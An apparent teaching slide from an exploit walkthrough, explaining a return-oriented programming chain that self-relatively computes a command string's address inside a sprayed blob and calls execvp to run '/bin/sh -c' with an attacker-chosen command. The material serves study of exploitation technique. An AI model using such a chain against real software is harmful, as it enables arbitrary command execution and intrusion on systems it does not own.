The ROP chain — computing &cmd with no known address

after the pivot, RSP walks down the chain (inside the blob)
goal: execvp("/bin/sh", { "/bin/sh","-c",&cmd,NULL })
      need:  rdi = "/bin/sh"    rsi = &argv
──────────────────────────────────────────────
1  push rsp ; pop rcx     rcx = RSP = blob + R
2  pop rax ; add rax,rcx   rax = &cmd
   ... ; add rax,0x12      (see the math →)
3  pop rdi ; mov [rdi],rax argv[2] = &cmd   (the 1 gap)
4  pop rdi                rdi = "/bin/sh"   (spray)
5  pop rsi                rsi = &argv       (spray)
6  call execvp@plt        → /bin/sh -c "cmd"
the self-relative math — all offsets inside a blob WE built
known (we chose the layout):
   command  at   blob + 160
   RSP lands at   blob + R     (a fixed spot)

   rcx = RSP = blob + R         ; push rsp ; pop rcx
   want:  &cmd = rcx + (160 − R)

gadgets only do:  rax = c ; rax += rcx ; rax += 0x12
so bake  c = 160 − R − 0x12  into the blob:
   rax = c              = 160 − R − 0x12
   rax += rcx (blob+R)  = blob + 160 − 0x12
   rax += 0x12          = blob + 160 = &cmd   ✓

160, R, 0x12 are constants WE picked. Only the base
(blob) is unknown — but rcx carries it, so it cancels:
we never have to predict it.

Everything but &cmd is pre-staged: "/bin/sh", the argv array, NULL → spray; "-c" → .rodata. Only &cmd sits in the moving blob — hence the math.
